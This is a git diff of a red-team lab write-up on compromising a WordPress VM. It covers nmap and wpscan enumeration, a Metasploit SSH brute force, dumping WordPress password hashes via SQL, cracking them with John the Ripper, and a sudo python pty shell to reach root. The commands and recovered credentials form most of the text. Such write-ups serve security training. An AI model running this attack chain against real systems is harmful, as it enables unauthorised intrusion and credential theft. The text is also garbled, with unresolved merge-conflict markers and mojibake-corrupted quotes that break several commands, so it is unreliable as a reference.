@@ -14,6 +14,9 @@ $ nmap -sV 192.168.1.110
 
 This scan identifies the services below as potential points of entry:
 
+![nmap](https://user-images.githubusercontent.com/92223941/167322975-5349cecb-c273-4a42-b673-84b126b66bb3.PNG)
+
+
 * Target 1
 	- Port 22/TCP SSH
 	- Port 80/TCP http
@@ -31,13 +34,19 @@ The following vulnerabilities were identified on each target:
 
 Exploitation
 
-The Red Team was able to penetrate†Target 1†and retrieve the following confidential data:
+The Red Team was able to penetrate¬†Target 1¬†and retrieve the following confidential data:
 
 * Target 1
-	- flag1.txt:†b9bbcb33e11b80be759c4e844862482d
+	- flag1.txt:¬†b9bbcb33e11b80be759c4e844862482d
 		- Exploit Used
 			- Used wpscan to enumerate the user from the      wordpress website
+<<<<<<< HEAD
 			- wpscan ñurl http://192.168.1.110/wordpress -enumerate u
+=======
+			- wpscan ‚Äìurl http://192.168.1.110/wordpress -enumerate u
+			![flag1a](https://user-images.githubusercontent.com/92223941/167323054-f8c2b10b-e834-45a1-bf7f-1283fe656693.PNG)
+
+>>>>>>> 3065bafc2a7bf33dc015554562fc0df02a02959d
 			- Used SSH scanner module on Metasploit to brute force login attempts with the username and Michael and wordlists from Kali
 			- Msfconsole
 			- Use auxiliary/scanner/ssh/ssh_login
@@ -47,23 +56,39 @@ The Red Team was able to penetrate†Target 1†and retrieve the following confident
 			- set USERNAME Michael
 			- set VERBOSE true
 			- run
+<<<<<<< HEAD
 			- I then login into Michael via SSH 
 			- SSH michael@192.168.1.110 password: michael
+=======
+			
+			![flag1c](https://user-images.githubusercontent.com/92223941/167322697-b6a57985-93ba-4480-87b8-1155fb5ec86e.PNG)
+			![flag1d](https://user-images.githubusercontent.com/92223941/167322753-bc60b2cf-8925-423d-aaef-10d562a389a3.PNG)
+			![flag1e](https://user-images.githubusercontent.com/92223941/167322783-4532f436-9483-4d4d-9c7b-35467c6147fd.PNG)
+			![flag1f](https://user-images.githubusercontent.com/92223941/167322800-4b27040c-e4e8-4bfb-92a7-888fa5753e72.PNG)
+
+
+
+
+			- I then login into Michael via SSH 
+			- SSH michael@192.168.1.110 password: michael
+			![flag1g](https://user-images.githubusercontent.com/92223941/167323288-8b4c13b5-06ca-48c1-a75c-587654283f3a.PNG)
+
+>>>>>>> 3065bafc2a7bf33dc015554562fc0df02a02959d
 			- I then went into the html directory and listed the directories in it
 			- cd /var/www/html
 			- ls
 			- I then went into the service.html file and found flag1.
 			- nano service.html
-			-  ctrl+w ìflagî
+			-  ctrl+w ‚Äúflag‚Äù
 
-	- flag2.txt:†fc3fd58dcdad9ab23faca6e9a36e581c
+	- flag2.txt:¬†fc3fd58dcdad9ab23faca6e9a36e581c
 		- Exploit Used
 			- I went back one directory and listed the files and found flag 2
 			- cd ..
 			- ls
 			- cat flag2.txt
 
-	- flag3.txt:†afc01ab56b50591e7dccf93122770cd2
+	- flag3.txt:¬†afc01ab56b50591e7dccf93122770cd2
 		- Exploit Used
 			- I went back to the html directory and went into the wordpress directory and listed the directories
 			- cd html
@@ -78,34 +103,51 @@ The Red Team was able to penetrate†Target 1†and retrieve the following confident
 			- I then selected wp_posts and was able to find flag3
 			- select * from wp_posts;
 
+<<<<<<< HEAD
 	- Flag4.txt:†715dea6c055b9fe3337544932f2941ce
+=======
+	- Flag4.txt:¬†715dea6c055b9fe3337544932f2941ce
+>>>>>>> 3065bafc2a7bf33dc015554562fc0df02a02959d
 		- Exploit Used
 			- While still being logged in via sql I described the table wp_users
 			- describe wp_users;
 			- I then formatted the username and passwords being separated by a colon sign.
+<<<<<<< HEAD
 			- select concat_ws(ë:í, user_login, user_pass) from wp_users;
+=======
+			- select concat_ws(‚Äò:‚Äô, user_login, user_pass) from wp_users;
+>>>>>>> 3065bafc2a7bf33dc015554562fc0df02a02959d
 			- I then outputted the formatted table into text file in the www directory and then viewed the file under michael
-			- select concat_ws(ë:í, user_login, user_pass) from wp_users into outfile ëvar/www/wp_hashes.txtí;
+			- select concat_ws(‚Äò:‚Äô, user_login, user_pass) from wp_users into outfile ‚Äòvar/www/wp_hashes.txt‚Äô;
 			- cat wp_hashes.txt
+<<<<<<< HEAD
 			- I copied wp_hashes.txt file and exited Michaelís computer and pasted the file on www directory on my pc
 			- ìcopied username and passwordsî
+=======
+			- I copied wp_hashes.txt file and exited Michael‚Äôs computer and pasted the file on www directory on my pc
+			- ‚Äúcopied username and passwords‚Äù
+>>>>>>> 3065bafc2a7bf33dc015554562fc0df02a02959d
 			- Exit
 			- cd /var/www
 			- ls
 			- touch wp_hashes.txt
 			- nano wps_hashes.txt
+<<<<<<< HEAD
 			- ìpasted username and passwordsî
+=======
+			- ‚Äúpasted username and passwords‚Äù
+>>>>>>> 3065bafc2a7bf33dc015554562fc0df02a02959d
 			- I ran john the ripper to brute force the password with the usernames and found the password for steven
 			- John wp_hashes.txt
 			- I logged into Steven via ssh 
 			- ssh steven password:pink84
 			- I ran a python command to login via root
+<<<<<<< HEAD
 			- sudo python -c ëimport pty:pty.spawn(ì/bin/bashî)í
+=======
+			- sudo python -c ‚Äòimport pty:pty.spawn(‚Äú/bin/bash‚Äù)‚Äô
+>>>>>>> 3065bafc2a7bf33dc015554562fc0df02a02959d
 			- I then went into the root directory I ran the list command and found flag 4 and then I viewed the flag
 			- cd /root
 			- ls
 			- cat flag4.txt
-
-
-
-
